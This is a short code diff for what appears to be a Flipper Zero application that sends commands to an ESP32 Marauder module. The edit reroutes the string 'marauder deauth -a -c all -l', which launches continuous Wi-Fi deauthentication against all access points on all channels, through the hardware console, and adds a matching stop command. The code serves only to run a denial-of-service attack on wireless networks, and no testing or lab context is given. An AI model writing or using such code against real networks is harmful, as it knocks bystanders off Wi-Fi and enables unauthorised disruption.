@@ -2,6 +2,7 @@
 #include <gui/gui.h>
 #include <input/input.h>
 #include <cli/cli.h>
+#include <furi_hal.h>
 
 static bool running = true;
 
@@ -25,10 +26,12 @@ static void draw_callback(Canvas* canvas, void* ctx) {
 // Launch continuous deauth via Marauder CLI
 static void launch_continuous_deauth() {
     Cli* cli = furi_record_open(RECORD_CLI);
-    if(!cli) return;
+    if(!cli) {
+        return;
+    }
     
-    // Start continuous deauth on all channels
-    cli_write(cli, (uint8_t*)"marauder deauth -a -c all -l\r\n", 31);
+    // Send command to Marauder
+    furi_hal_console_tx("marauder deauth -a -c all -l\r\n");
     furi_delay_ms(200);
     
     furi_record_close(RECORD_CLI);
@@ -39,7 +42,7 @@ static void stop_deauth() {
     Cli* cli = furi_record_open(RECORD_CLI);
     if(!cli) return;
     
-    cli_write(cli, (uint8_t*)"marauder deauth -s\r\n", 21); // stop
+    furi_hal_console_tx("marauder deauth -s\r\n");
     furi_delay_ms(100);
     
     furi_record_close(RECORD_CLI);
